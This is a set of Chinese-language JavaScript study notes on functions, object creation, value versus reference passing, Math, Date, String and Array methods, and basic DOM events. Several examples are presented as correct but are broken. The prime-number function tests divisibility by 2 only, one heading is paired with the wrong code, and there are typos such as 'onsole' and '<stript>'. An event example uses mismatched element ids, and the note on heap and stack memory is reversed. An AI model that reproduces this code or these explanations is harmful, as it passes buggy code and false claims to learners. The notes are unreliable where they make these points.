     console.log(arguments.length);
     //使用arguments对象可以获取传入的每个参数的值
     console.log(arguments);
   }

   f1(10,20,30,40,100,200);//调用
```

>[danger] ##### 案例
```
function f1() {
    var sum = 0;
    for(var i =0;i<arguments.length;i++){
        sum+=arguments[i];
    }
    return sum
};
console.log(f1(10,20,30,20));
```
[TOC]
>[danger] #####  求两个数字的差
```
 function getSub(x, y) {
      return x - y;
    }
    console.log(getSub(10, 20));
```
>[danger] #####  求2个数的最大值
```
function getTwoMax(x, y ){
            return x>y? x:y
        }
        console.log(getTwoMax(6,7))
```
>[danger] #####  求三个数的最大值
```
 function getThreeMax(x, y, z){
            return x > y ? ( x > z ? x : z) : ( y > z ? y : z)
        }
        console.log(getThreeMax(10, 2, 4))
```
>[danger] #####  判断一个数是否是素数(质数)
```
 //判断一个数是否是素数(质数),只能被1和自身整除，质数是从2开始
 function isPrimeNumber(num) {
       for(var i=2;i<num;i++){
          if (num%2 == 0){
                 return false
               }
           }
           return true
       }
        console.log(isPrimeNumber(8)?"是质数":"不是质数");
```
>[danger] #####  求数组中最大值，用等价替换
```
function getArraryMax(array){
    // 假如 传进的数组中第一个数为最大值，做中间对比值
    var max = array[0]
    for(var i = 1; i < array.length; i++){
        if(max < array[i]){
            max = array[i]
        }
    }
    return max
}
var arr = [10,20,30,40,50]
console.log(getArraryMax(arr))
```
>[danger] #####  求一个数组中的最大值和最小值还有和
```
 function getSub(x, y) {
      return x - y;
    }
    console.log(getSub(10, 20));
```
>[danger] #####  求两个数字的差
```
 /**
         *  给我一个数组,我返回一个数组(最大值,最小值,和)
         * @param array参数是一个数组
         * @returns {*[]}返回值是一个数组,第一个元素值是最大值,第二个元素值是最小值,第三个元素值是和
         */
        function getArrayMaxAndMinAndSum(array) {
            var min = array[0];//最小值
            var max = array[0];//最大值
            var sum = 0;//和
            for (var i = 0; i < array.length; i++) {
                sum += array[i];//和
                //最大值
                if (max < array[i]) {
                    max = array[i];
                }// end if
                //最小值
                if (min > array[i]) {
                    min = array[i];
                }// end if
            }// end for
            var arr = [max, min, sum];
            return arr;
        }
        //测试
        var resultArray = getArrayMaxAndMinAndSum([1, 2, 3, 4, 5, 6, 7]);
        console.log("最大值:" + resultArray[0]);//7
        console.log("最小值:" + resultArray[1]);//1
        console.log("和:" + resultArray[2]);//28

```



>[danger] ##### 反转数组
```
        function reverseArray(arr){
            for(var i=0;i < arr.length/2;i++){
                // 中间 变量
                var temp = arr[i]
                arr[i] = arr[arr.length-1-i]
                arr[arr.length-1-i] = temp;
            }
            return arr
        }
        console.log(reverseArray([1, 2, 3, 4, 5, 6]))
```

>[danger] ##### 菲波那切数列
```
        // 1 1 2 3 5  8 13 21 34 55 89
        function Fb(num) {
            temp1 = 1;
            temp2 = 1;
            sum = 0;
            for(var i=2;i<num;i++){
                sum = temp1+temp2
                temp1 = temp2
                temp2 = sum
            }
            return sum
        }
        console.log(Fb(5))
```

>[danger] ##### 求一年中的几天
```
  //输入,年月日,获取这个日期是这一年的第多少天

    //判断这个年份是不是闰年
    function isLeapYear(year) {
      return year%4==0&&year%100!=0||year%400==0;
    }
    //年---月---日:2017年4月28日
    function getDays(year, month, day) {
      //定义变量存储对应的天数
      var days = day;
      //如果用户输入的是一月份,没必要向后算天数,直接返回天数
      if (month == 1) {
        return days;
      }
      //代码执行到这里-----说明用户输入的不是1月份
      //用户输入的是7月份23日----1，2，3  +23
      //定义一个数组,存储每个月份的天数
      var months = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
      //小于的是输入的月份-1
      for (var i = 0; i < month - 1; i++) {
        days += months[i];
      }
      //需要判断这个年份是不是闰年
      if(isLeapYear(year)&&month>2){
        days++;
      }
      return days;
    }

     console.log(getDays(2000,3,2));

```
>[success] #  js 对象
```
1.调用系统的构造函数创建对象
2.自定义构造函数创建对象(结合第一种和需求通过工厂模式创建对象)
3.字面量的方式创建对象

```

>[danger] ##### instanceof 判断一个对象或者变量类型
```
1. 变量 instanceof 类型的名字----->布尔类型,true就是这种类型,false不是
```
[TOC]
>[success] # 用系统自带的构造函数创建

```
1.用系统自带的new Object(); 来创建对象
```

>[danger] ##### 构造对象个人理解
```
1.就是用js 自带的Object对象，来进行自定制的对象构建
```

>[danger] ##### 基础案例
* 创建一个人对象
```
    var person= new Object();
    person.name = "w";
    person.age = 38;
    person.sex = "男"
    person.eat = function () {
        console.log("吃饭")
    }
    console.log(person.name);//获取--输出了
    console.log(person.age);
    console.log(person.sex);
    person.eat();
```
* 创建一个猫对象
```
    var cat= new Object();
    cat.name = "c";
    cat.age = 2;
    cat.sex = "公"
    cat.eat = function () {
        console.log("吃饭")
    }
    console.log(cat.name);//获取--输出了
    console.log(cat.age);
    console.log(cat.sex);
    cat.eat();
```

>[danger] ##### 使用this
```
1.this 和python 中self 一样 都是代指当前对象，
2.下面案例中的this.name 和 person.name 是等价的，this指的就是当前对象person
```
```
    var person = new Object();
    person.name = "w";
    person.age = 38;
    person.sex = "男"
    person.eat = function () {
        console.log(this.name+"吃饭")
        console.log(person.name+"吃饭")
    }
    console.log(person.name);//获取--输出了
    console.log(person.age);
    console.log(person.sex);
    person.eat();
```
>[success] # 工厂模式创建类
```
1.系统自带的Object 创建对象，我们理解成面向过程，零散复用性差
2.我们利用函数 将这些零散的封装成函数，函数作为工厂的机器将这些复用的Object调用
3. 由于我们调用的是系统函对象，所以在函数的最后我们要将这个对象返回用return
```

>[danger] ##### 案例

```
1.用我们自定义的createObject函数将系统构造函数创建的对象封装
2.返回被我们重新定义的系统构造函数生成对象
```
```
    function  createObject(name, age) {
        var obj = new Object();
        obj.name = name;
        obj.age = age;
        obj.say = function () {
            console.log("我是"+this.name);
        };
        return obj;
    }

    var per = createObject("小红", 20)
    var per1 = createObject("Daming", 21)
    per.say();   // 我是小红
    per1.say();  // 我是Daming
```
>[success] # 自定义构造函对象
```
1.自定义构造函数创建对象,自己定义一个构造函数,自定义构造函数,创建对象
2.函数和构造函数的区别；名字是不是大写(首字母是大写)
3.就是在工厂模式下的升级版本，不用去在函数内部声明，系统函数
```

>[danger] ##### 案例
```
1.和工厂函数的区别，不用内部声明系统函数，不用return 返回
2.this 指的是当前对象
``` 
```
    function Person(name,age) {
        this.name = name;
        this.age = age;
        this.say = function () {
            console.log(this.name+this.age);
        };
    }
    var per = new Person("香茗", 10);
    per.say()
```
>[danger] ##### 自定义构造函数做了什么
```
 1. 在内存中开辟(申请一块空闲的空间)空间,存储创建的新的对象
2. 把this设置为当前的对象
3. 设置对象的属性和方法的值
4. 把this这个对象返回
```

>[danger] ##### 内存声明
```
1.堆存储的对象的地址，指向 栈 中的 对象声明
```
>[success] # 字面量函数
```
1.字面量创建对象的缺陷: 一次性的对象
2.类似python 中的字典
```

>[danger] ##### 案例
```
    var person = {
        name:"小明",
        age:20,
        sayHi:function () {
            console.log("我是:"+this.name);
        }
    };
    person.sayHi();
```

>[danger] ##### 跟python 字典一样的使用方法
```
function Person(name,age) {
      this.name=name;
      this.age=age;
      this.play=function () {
          console.log("我喜欢你");
      };
    }
    var obj=new Person("小明",20);
   
    obj["name"]="大名";
    console.log(obj["name"]);

    obj.play();
    obj["play"]();
```
>[success] # 循环json 格式数据
```
1.循环json 数据 可以用for i in 格式
2.其中  接受的变量 i 等同于 字典的k
3.json[k] 根据字典的k 打印出来value
4.json.k 打印出undefined，由于 js 使用点，意思是使用当前的变量
 属性，相当用 要打印 json 中k的值为k 的vaule，然而下面的案例中的
  json 没有一个k 是k，所以就相当于声明一个变量k 没有赋值
```
```
var json = {
    "name": "小明",
    "age": "10",
    "sex": "男"
};
for(var k in json) {
    console.log(k);  // name age sex
    console.log(json[k]); // 小明 年龄 性别
    console.log(json.k);  // undefined undefined undefined
}
```
>[success] # js 基本类型和引用类型
```
1.基本类型(简单类型),值类型: number,string,boolean
2.复杂类型(引用类型):object
3.原始数据类型: number,string,boolean,undefined, null,object
4.空类型:undefined,null
```

>[danger] ##### 基本类型和引用类型数据传递

* 基本类型
```
1.var num=10;//值类型,值在栈上
2.值类型之间传递,传递的是值
3.值类型作为函数的参数,传递的是值
```
```
var num=10;
var num2=num;//传递的值

function f1(x) {
 x=100;
}
var num=100;
f1(num);
console.log(num);//100
```
* 引用类型
```
1.var obj={};//复杂类型,对象在堆,地址(引用)在栈
2.引用类型之间传递,传递的是地址(引用)
3.引用类型作为函数的参数,传递的是地址
```
```

var obj={
  name:"小明"
};
function f2(obj2) {
  obj2.name="小红";
}
console.log(obj.name);// 小明
f2(obj);
console.log(obj.name);// 小红
```

>[danger] ##### 案例深入
* 案例一
```
 var num1 = 10;
 var num2 = num1;
 num1 = 20;
 console.log(num1);//20
 console.log(num2);//10
```

* 案例二

```
1.第一次错误理解认为函数中的num 是全局变量
2.下面的代码可以看成如下
 var num = 50;
 function f1(num) {
   // 形参中的num 相当于定义的num
   var num = 50；
   // 60 相当于给 局部变量定义的num =50 重新赋值成60
   num = 60;
   console.log(num);//60
 }
 f1(num);
 console.log(num);//50
```
```
 var num = 50;
 function f1(num) {
   num = 60;
   console.log(num);//60
 }
 f1(num);
 console.log(num);//50
```

* 案例三
```

 var num1 = 55;
 var num2 = 66;
 function f1(num, num1) {
   num = 100;
   num1 = 100;
   num2 = 100;
   console.log(num);//100
   console.log(num1);//100
   console.log(num2);//100
 }

 f1(num1, num2);



 console.log(num1);//55
 console.log(num2);//100
 console.log(num);// 报错
```

* 案例四
```
1.因为对象是地址的指向，同一个对象所对应的堆中，所以统一对象内 
 容变就根这变
2.函数中的那个person 对象只是名字相同，但实际是一个新对象
```
```
function Person(name,age,salary) {
  this.name = name;
  this.age = age;
  this.salary = salary;
}
function f1(person) {
  person.name = "ls";
  person = new Person("aa",18,10);
}

var p = new Person("zs",18,1000);
console.log(p.name); // zs
f1(p);
console.log(p.name); // ls
```
>[success] # 内置对象
```
1.内置对象利用的是var OBJ={} 创建的对象
2.所以不用想 构造对象那样需要 var obj = new Object()创建对象
3.实例对象:通过构造函数创建出来,实例化的对象
4.静态对象:不需要创建,直接就是一个对象,方法(静态方法)直接通过这个
 象名字调用,
5.实例方法必须通过实例对象调用
6.静态方法必须通过大写的对象调用
```
[TOC]

>[success] # Math 对象

>[danger] ##### Math.PI 打印π
```
onsole.log(Math.PI); // 3.141592653589793
```

>[danger] ##### Math.abs 绝对值
```
console.log( Math.abs(-2));//2
console.log(Math.abs(null));//---------0  重点
console.log(Math.abs("string"));//NaN
```

>[danger] ##### Math.ceil 向上取整
```
console.log(Math.ceil(12.9));  // 13
console.log(Math.ceil(12.09)); // 13
```

>[danger] ##### Math.floor 向下取整
```
console.log(Math.floor(12.3)); //12
console.log(Math.floor(12.9)); // 12
```

>[danger] ##### Math.max 最大值
```
console.log(Math.max(10,1,9,100,200,45,78));
```

* 创建一个类似max 功能，求最大值 时候默认一个最大值
```
// 创建类似注意，使用的是函数的方法，所以要创建方法
MyMath = {
    getMax:function () {
        var max = arguments[0];
        for(var i =1;i<arguments.length;i++){
            if(max<arguments[i]){
                max = arguments[i];
            }
        }
        return max;
    }
}

var result=MyMath.getMax(10,20,30,40,100,3);
console.log(result);
```
* 第二种自定义写法
```
//例子:自己定义一个对象,实现系统的max的方法
function MyMath() {
  //添加了一个方法
  this.getMax=function () {
    //所有数字中的最大值
    var max=arguments[0];
    for(var i=0;i<arguments.length;i++){
      if(max<arguments[i]){
        max=arguments[i];
      }
    }
    return max;
  };
}
//实例对象
var mt=new MyMath();
var result=mt.getMax(10,20,30,40,100,3);
console.log(result);
```
>[danger] ##### Math.min 最小值
```
console.log(Math.min(10,1,9,100,200,45,78));
```
>[danger] ##### Math.random() 生成随机数
```
console.log(parseInt(Math.random()*5)+1); //1-5随机数
```

>[success] # Math 案例
```
1. 每次刷新 生成一个 颜色的div 块
```
```
<style>
    div {
        width: 300px;
        height: 200px;
        background-color: pink;
    }
</style>
<script>
    function getColor() {
        var str="#";
        // 一个十六进制的数组
        var arr = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"];
        for(var i = 0; i < 6; i++){
            var num = parseInt(Math.random() * 16);
            str += arr[num];
        }
        return str
    }
    console.log(getColor())
    window.onload = function (){
        document.getElementById('dv').style.backgroundColor = getColor()
    }
</script>
<div id="dv"></div>
```
[TOC]
>[success] #  时间的内置对象Date
```
1.声明使用 var dt = new Date()
```

>[danger] ##### 时间对象返回值
```
var dt = new Date();
console.log(dt);

打印结果 
Sat Jun 30 2018 17:28:08 GMT+0800 (中国标准时间)
```

>[danger] ##### 时间对象内传参

* 第一种格式  2018-08-12
```
var dt = new Date("2018-08-12");
console.log(dt);

打印结果 默认时分秒从零点开始：
Sun Aug 12 2018 00:00:00 GMT+0800 (中国标准时间)
```

* 第二种格式  2018/08/12
```
var dt = new Date("2018/08/12");
console.log(dt);

打印结果 默认时分秒从零点开始：
Sun Aug 12 2018 00:00:00 GMT+0800 (中国标准时间)
```

>[danger] ##### 时间戳-四种方法
* 第一种 直接使用内置函数Date.now()
```
var dt = Date.now();
console.log(dt);

打印结果：
1530354058040
```
* 第二种 使用Number 转换Date 对象
```
var dt = new Date()
console.log(Number(dt))

打印结果：

```
* 第三种 使用getTime()
```
var dt = new Date()
console.log(dt.getTime())

打印结果：
1530354058040
```
* 第四种 使用valueOf()
```
var dt = new Date()
console.log(dt.valueOf())

打印结果：
1530354058040
```

>[danger] ##### 时间戳变成时间格式
 
```
var dt = new Date(1530354516147)
console.log(Date(1530354516147))
```

>[danger] ##### 打印年月日时分秒
```
var dt = new Date();
console.log(dt.getFullYear());   // 年
console.log(dt.getMonth()+1);  // 月 月份是从0开始
console.log(dt.getDate());    // 几号
console.log(dt.getDay());	 // 星期几 星期日 是0，其余一致
console.log(dt.getHours()); // 小时
console.log(dt.getMinutes()); // 分钟
console.log(dt.getSeconds()); // 秒
```
>[danger] ##### 将日期格式转换成字符串两种
```
var dt = new Date();
console.log(dt.toDateString(),typeof dt.toDateString());
console.log(dt.toLocaleDateString(),typeof dt.toLocaleDateString());

打印结果：
Sat Jun 30 2018       string
2018/6/30             string
```

>[danger] ##### 将时分秒转换成字符串
```
var dt = new Date();
console.log(dt.toTimeString(),typeof dt.toTimeString());
console.log(dt.toLocaleTimeString(),typeof dt.toLocaleTimeString());

打印结果：
20:12:26 GMT+0800 (中国标准时间) string
下午8:12:26 string
```

>[danger] ##### 将整个Date 对象编程字符串
```
var dt = new Date();
console.log(dt.toString(), typeof dt.toString())

打印结果：
Sat Jun 30 2018 20:12:26 GMT+0800 (中国标准时间) string
```

>[danger] ##### 不支持h5 格式浏览器 对象声明
```
var dt=+new Date();//
```

>[success] # 练习返回中国格式的时间对象
```
1.调用时必须声明对象，否则报错
```
```
function getDate(dt) {
    var year = dt.getFullYear();
    var month = dt.getMonth() + 1;
    var day = dt.getDate();
    var hour = dt.getHours();
    var minute = dt.getMinutes();
    var second = dt.getSeconds();
    month = month<10 ? "0"+month : month;
    day = day<10 ? "0"+day : day;
    hour = hour<10 ? "0"+hour : hour;
    minute = minute<10 ? "0"+minute : minute;
    second = second<10 ? "0"+second:second;
    return year + "年" + month + "月" + day + "日 " + hour + ":" + minute + ":" + second;
}

var dt = new  Date()
console.log(getDate(dt))
getDate(dt);
```
[TOC]
>[success] # String
```
1.String 可以看成一个不可以更改的 数组
2.String 虽然是基本类型也可以看做 对象 给java 的定义相似
3.String 其他定义类似python 定义
```

>[danger] ##### 花式字符串 循环
* python  for i in 在js 中对字符串打印的是，位置脚标，取值的时候循环转换一下
```
var a = "太帅了";
for (num in a){
    console.log(a[num]);
}

打印结果：
太
帅
了
```

>[success] # String 方法
```
 * .length------>字符串的长度
 * .charAt(索引),返回值是指定索引位置的字符串,超出索引,结果是空字符串
 * .fromCharCode(数字值,可以是多个参数),返回的是ASCII码对应的值
 * .concat(字符串1,字符串2,...);返回的是拼接之后的新的字符串
 * .indexOf(要找的字符串,从某个位置开始的索引);返回的是这个字符串的索引值,没找到则返回-1
 * .lastIndexOf(要找的字符串);从后向前找,但是索引仍然是从左向右的方式,找不到则返回-1
 * .replace("原来的字符串","新的字符串");用来替换字符串的
 * .slice(开始的索引,结束的索引); 从索引5的位置开始提取,到索引为10的前一个结束,没有10，并返回这个提取后的字符串
 * .split("要干掉的字符串",切割后留下的个数);切割字符串
 * .substr(开始的位置,个数);返回的是截取后的新的字符串
 * .substring(开始的索引,结束的索引),返回截取后的字符串,不包含结束的索引的字符串
 * .toLocaleLowerCase();转小写
 * .toLowerCase();转小写
 * .toLocaleUpperCase()转大写
 * .toUpperCase();转大写
 * .trim();干掉字符串两端的空格
```
>[danger] ##### 长度属性--length
```
var a = "太帅了";
console.log(a.length);

打印结果：
3
```
>[danger] ##### 位置的字符--charAt
```
1.charAt(索引),返回值是指定索引位置的字符串,超出索引,结果是空字符串
```
```
var a = "太帅了";
console.log(a.charAt(1));

打印结果：
帅
```
>[danger] ##### ASCII码 转成字符--fromCharCode
```
var str=String.fromCharCode(107,108,109);
console.log(str)

打印结果：
klm
```
>[danger] ##### 在末尾拼接字符串--concat

```
1.给创建接受，返回的新字符串，不会在字符串变量不会改变
```
```
var a = "太帅了";
a = a.concat("我", "真的")
console.log(a)

打印结果：
太帅了我真的
```
>[danger] ##### 通过指点字符找到位置--indexOf

```
 1.indexOf(要找的字符串,从某个位置开始的索引);返回的是这个字符串的索引值,没找到
  则返回-1
```
```
var a = "你是你是谁"
console.log(a.indexOf("你",2))

打印结果：
2
```
>[danger] ##### 自定字符从后面找到位置--lastIndexOf

```
 1.lastIndexOf(要找的字符串);从后向前找,但是索引仍然是从左向右的方式,找不到则返
  回-1
```
```
var a = "你是你是谁"
console.log(a.lastIndexOf("你"))

打印结果：
2
```

>[danger] ##### 替换--replace

```
1.js replace 相比python 他只能替换一个，而不能像python替换所有
```
```
var a = "你是你是谁"
console.log(a.replace("你","我"))

打印结果：
我是你是谁
```

>[danger] ##### 切片--slice

```
1.js 切片 顾头不顾腚
```
```
var a = "你是你是谁"
console.log(a.slice(0,2))

打印结果：
你是
```
>[danger] ##### 分割--split

```
1.返回一个数组
```
```
var a = "你是|你是|谁"
console.log(a.split("|"))

打印结果：
["你是", "你是", "谁"]
```

>[danger] ##### 截取几个--substr

```
1.指定开始位置截取几个
```
```
var a = "你是|你是|谁"
console.log(a.substr(0,2))

打印结果：
你是
```

>[danger] ##### 从哪截取到那--substring

```
1.指定开始位置结束位置，顾头不顾腚截取
```
```
var a = "你是|你是|谁"
console.log(a.substring(0,3))

打印结果：
你是|
```

>[danger] ##### 大/小写 
```
1.Locale 针对地区的，总体一样的
```
```
 * .toLocaleLowerCase();转小写
 * .toLowerCase();转小写
 * .toLocaleUpperCase()转大写
 * .toUpperCase();转大写
```
>[danger] ##### 去收尾空格-trim

>[success] # 练习题

>[danger] ##### 判断字符串中，一个字符出现的位置

```
1.利用indexof 特性 匹配的字符串 和从哪里开始匹配字符串
2.在循环中index 记录的是str.indexOf(char,index) 字符串的位置，所以要个index重
  新赋值成 字符位置
```
```
function charindexof(str,char) {
    var index  = 0 //
    var list_index = []
    while((index = str.indexOf(char,index))!=-1){
        list_index.push(index)
        index += char.length
    }
    return list_index
}

var a = "sewsssddss"
console.log(charindexof(a,"s"))
```

>[danger] ##### 统计字符串中相同的数据
```
1.注意 if 判断的是value值，而不是 k ，之前思考错误导致 ，问题
```
```
    function charindexof(str) {
        count = {}
        for(var i=0;i<str.length;i++){

            // 判断value
            if(count[str[i]]){
                count[str[i]] +=1;
            }else{
                count[str[i]] = 1;
            }
        }
        return count
    }

    var a = "sewsssddss"
    console.log(charindexof(a))

```
[TOC]
>[success] # 内置对象Array
```
* Array.isArray(对象)---->判断这个对象是不是数组
 * instanceof关键字
 * .concat(数组,数组,数组,...) 组合一个新的数组
 * .every(函数)--返回值是布尔类型,函数作为参数使用,函数中有三个参数,第一个参数是元素的值，第二个参数是索引值,第三个参数是原来的数组(没用)
 * 如果这个数组中的每个元素的值都符合条件,最后才返回的是true
 *
 * .filter(函数);返回的是数组中每一个元素都复合条件的元素,组成了一个新的数组
 *
 * .push(值);--->把值追加到数组中,加到最后了---返回值也是追加数据之后的数组长度
 * .pop();--->删除数组中最后一个元素,返回值就是删除的这个值
 * .shift();--->删除数组中第一个元素,返回值就是删除的这个值
 * .unshift();--->向数组的第一个元素前面插入一个新的元素,----返回值是插入后的程度
 * .forEach(函数)方法---遍历数组用---相当于for循环
 * .indexOf(元素值);返回的是索引,没有则是-1
 * .join("字符串");----返回的是一个字符串
 * .map(函数);--->数组中的每个元素都要执行这个函数,把执行后的结果重新的全部的放在一个新的数组中
 * .reverse();----->反转数组
 * .sort();---排序的,可能不稳定,如果不稳定,请写MDN中的那个固定的代码
 * .arr.slice(开始的索引,结束的索引);把截取的数组的值放在一个新的数组中,但是不包含结束的索引对应的元素值
 * .splice(开始的位置,要删除的个数,替换的元素的值);一般是用于删除数组中的元素,或者是替换元素,或者是插入元素
```
>[danger] ##### 判断是不是数组
```
var a = [1,2,3,4,5];
console.log(Array.isArray(a));
console.log( a instanceof Array );

打印结果：
true
true
```

>[danger] ##### 数组的拼接--concat
```
var a = [1,2,3];
var b = [4,5,6];
var c = a.concat(b);
console.log(c)

打印结果：
[1, 2, 3, 4, 5, 6]
```

>[danger] ##### 数组的拷贝--from
```
var arr=["a","b","c"];
var newArr=Array.from(arr);
```

>[danger] ##### 循环数组操作return bool 类型---every 
```
1.回调函数中第一个参数元素的值，二个索引，第三个是原数组（实际用不上）
2.每一个元素都符合，函数内的判断，返回的是bool 类型
```
```
// 判断数组中每一个 元素 值是不是大于200
var a = [100,200,300];
// 回调函数
var flag = a.every(function (a, b) {
    return a>200
});
console.log(flag)

打印结果：
false
```

>[danger] ##### 过滤出符合判断的新数组--fittler
```
// 过滤生成新元素,返回所有奇数
var a = [1,2,3,4,5,6];
var newA  = a.filter(function (ele) {
    return ele%2
})
console.log(newA)

打印结果：
[1,3,5]
```

>[danger] ##### 数组的基本操作-- 增删
```
 1 .push(值);--->把值追加到数组中,加到最后了---返回值也是追加数据之后的数组长度
 2 .pop();--->删除数组中最后一个元素,返回值就是删除的这个值
 3 .shift();--->删除数组中第一个元素,返回值就是删除的这个值
 4 .unshift();--->向数组的第一个元素前面插入一个新的元素,----返回值是插入后的程度
```

```
var a = [1,2,3,4,5,6];
a.push("a");
console.log(a)

var a = [1,2,3,4,5,6];
a.pop();
console.log(a)

var a = [1,2,3,4,5,6];
a.shift();
console.log(a)

var a = [1,2,3,4,5,6];
a.unshift(1);
console.log(a)

打印结果：
[1, 2, 3, 4, 5, 6, "a"]
[1, 2, 3, 4, 5]
[2, 3, 4, 5, 6]
[1, 1, 2, 3, 4, 5, 6]
```

>[danger] ##### 循环数组中所有元素--forEach()
```
1.第一个参数元素，二个是位置
```
```
var a = [1,2,3,4,5,6]
    a.forEach(function (ele, index) {
        console.log(ele, index)
    })

打印结果：
1 0
2 1
3 2
4 3
5 4
6 5
```

>[danger] ##### 根据元素返回索引--indexOf()
```
1.存在则返回对应位置，不存在 返回-1
```
```
var a = [1,2,3,4,5,6];
console.log(a.indexOf(4))

打印结果：
3
```

>[danger] ##### 将数组拼接成字符串--join
```
var a= [1,2,3,4];
console.log(a.join("|"))

打印结果：
1|2|3|4
```

>[danger] ##### 执行每一个元素返回数组--map
```
1.参数是每一个元素
```
```
var a= [1,2,3,4];
a = a.map(function (value) {
    return value+1
})
console.log(a)

打印结果：
[2,3,4,5]
```

>[danger] ##### 反转数组--reverse()
```
var a= [1,2,3,4];
console.log(a.reverse())

打印结果：
[4,3,2,1]
```

>[danger] ##### 对数组做切片-- slice
```
1.顾头不顾腚
```
```
var a= [1,2,3,4];
console.log(a.slice(0,2))

打印结果：
[1,2]
```

>[danger] ##### 从指定位置删除元素-- splice
```
1.第一个参数，起始位置
2.第二个参数，删除的个数
3.第三个参数，要替换的元素
4.返回值是删除元素的列表
```
```
var a= [1,2,3,4];
a.splice(0,2)
console.log(a)

var a= [1,2,3,4];
a.splice(0,2,66)
console.log(a)

打印结果：
[3,4]
[66,3,4]
```

>[damger] ##### 数组的排序--sort
```
1.sort()是根据字符编码的顺序进行排序，所以对数字类型排序需要自定义
2.
如果 compareFunction(a, b) 小于 0 ，那么 a 会被排列到 b 之前；
如果 compareFunction(a, b) 等于 0 ， a 和 b 的相对位置不变。备注： ECMAScript 标准并不保证这一行为，而且也不是所有浏览器都会遵守（例如 Mozilla 在 2003 年之前的版本）；
如果 compareFunction(a, b) 大于 0 ， b 会被排列到 a 之前。
compareFunction(a, b) 必须总是对相同的输入返回相同的比较结果，否则排序的结果将是不确定的。
```
```
var a= [1,2,18,4,1,22];
console.log(a.sort())

打印结果：
[1, 1, 18, 2, 22, 4]


var a= [1,2,18,4,1,22];
console.log(a.sort(function (a1,a2) {
    if(a1>a2){
        return 1;
    }else if (a1<a2){
        return -1
    } else {
        return 0
    }
}))

打印结果：
[1, 1, 2, 4, 18, 22]
```
>[danger] ##### find 查询返回findIndex

>[danger] ##### findIndex 返回id
>[success] # DOM 文档对象模

```
1.DOM 全称Document Object Model 
2.DOM 中文名称文档对象模型
3.DOM 作用作用操作页面的元素
```
>[danger] ##### htm 和xml 区别
```
1.HTML:展示信息,展示数据的
2.XML:侧重于存储数据
``` 

>[success] # DOM树模型建立
```
1.文档：把一个html文件看成是一个文档,由于万物皆对象,所以把这个文档看成是
 一个对象XML文件也可以看成是一个文档
2.元素：页面中的每个标签,都是一个元素(element),每个元素都可以看成是一个
  对象，标签可以嵌套,标签中有标签,元素中有元素
3.节点：页面中所有的内容都是节点:标签,属性,文本
```
>[danger] ##### 简单概括
```
1.文档:一个页面就是一个文档
2.元素(element):页面中的所有的标签都是元素,元素可以看成是对象
3.节点(node):页面中所有的内容都是节点:标签,属性,文本
4.html 页面中的根元素：html页面中都有一个根标签--html--也叫根元素
```
![](https://box.kancloud.cn/44b2cd23163886f12ccb17368024b40d_475x258.png)
[TOC]
>[success] # 常见的操作DOM 方法
* 元素常见的属性
```
1.阻止链接跳转 在触发事件中加return flase
2.disabled input 禁用
3.innerHTML 获取设置标签内容，可将标签展示
4.innerText/innerHTML 获取设置文本内容
5.checked = “checked”因为字符串本身是true
6.selected = “selected”因为字符串本身是true
7.value 给input赋值
```

* 获取元素常见的属性
```
1.document.getElementById            --- 操作id，返回元素对应
2.document.getElementsByTagName()    --- 操作标签，返回数组
3.getAttribute()                     --- 获取自定的属性值,返回元素
4.setAttribute()                     --- 赋值自定义属性
5.removeAttribute()                  --- 删除属性
6.children                           --- 获取元素的子类
7.childNodes          				 --- 获取子类节点
8.firstChild                         --- 第一个子节点(谷歌火狐) 第一个子元素(IE8)
9.firstElementChild                  --- 第一个子元素（谷歌火狐） （IE8）不支持
10.lastChild                         --- 最后一个子节点(谷歌火狐) 第一个子元素(IE8)
11.lastElementChild                  --- 最后一个子元素（谷歌火狐） （IE8）不支持
12.parentNode                        --- 获取父类节点
13.parentElement  	                 --- 获取父类元素
14.getAttributeNode()                --- 获取属性节点
15.previousSibling                   --- 前一个兄弟节点
16.previousElementSibling            --- 前一个兄弟元素
17.nextSibling                       --- 后一个兄弟节点
18.nextElementSibling                --- 后一个兄弟元素
19.appendChild                       --- 在父类追加一个子集
20.insertBefore                      --- 向前插入子元素
21.removeChild                       --- 移除子元素 父类点出来，找到子类参数删除
22.replaceChild                      --- 替换子元素
23.addEventListener                  --- 按钮绑定多个事件 支持火狐/谷歌
24.attachEvent                 		 --- 钮绑定多个事件 支持IE8
25.ulObj.children[0].cloneNode(true)    --- 要复制的对象.cloneNode true深度复制


部分浏览器不支持：
1.document.getElementsByName("name属性的值")           --- 操作name，返回数组
2.document.getElementsByClassName("类样式的名字")       --- 操作类样式的名字，返回数组
3.document.querySelector("选择器的名字");               --- 操作选择器的名字，返回元素对应
4.document.querySelectorAll("选择器的名字")             --- 操作选择器的名字，返回数组
```

* 常见的一些事件
```
1.onmouseover   --- 鼠标移入
2.onmouseout    --- 鼠标移出
3.onfocus       --- 获取焦点
4.onblur        --- 失去焦点
5.onkeyup       --- 键盘抬起事件
6.onscroll      --- 滚动事件
```





>[success] # 几种常见写法
```
1.第一种的缺点直接写在html中，可定执性差
2.第二种的确定，如果定义函数 出现重名容易出现被顶掉的情况
3.第三种优点，使用了匿名函数不怕函数重名问题
```

>[danger] ##### 第一种，将事件绑定在html中
```
<input type="button" value="弹窗提示" onclick="alert('点击事件')">
```
>[danger] ##### 第二种，将函数绑定在html中
```
1.第一f1函数在js 里面调用没有括号，如果有页面加载的时候就直接弹出弹窗，因为
 页面加载遇到f1() 加括号的时候就直接执行这个函数
```
```
<input type="button" value="弹窗提示二" id="btn1" onclick="f1()">

<stript>
	function f1(){
        alert("点击事件")
    }
    document.getElementById("btn1").onclick = f1; // 加了括号直接运行了方法
</stript>
```
>[danger] ##### 第三种推荐
```
<input type="button" value="弹窗提示三" id="btn">

<stript>
	document.getElementById("btn").onclick = function () {
        alert("点击事件")
    };
</stript>
```
* 优化
```
<input type="button" value="弹窗提示三" id="btn">

<stript>
	var btnObj1=document.getElementById("btn1");
  	//为该元素注册点击事件
    btnObj1.onclick=function () {
    alert("哦,这真是太好了");
    };
 </stript>
```
>[success] # 总结理解
```
1.首先 文档是一个对象，所以我们直接使用document 对象
2.文档中的对象有，元素，元素又可以被看成对象 ，所以通过文档对象调用元素对象
 ，通过getElementById("btn1") 获取id 是btn的元素
3. type class onclick value 等等都是这些元素所拥有的对象，所以我们最终去调用这
 些对象，然后对他们进行重新的赋值操作
```
* 打印元素
```
console.log(document.getElementById("btn"))
打印结结果：
<input type=​"button" value=​"弹窗提示二" id=​"btn">​

根据这个打印结果我们也可以理解，当我们获得了这么一组标签后，在通过标签里面的
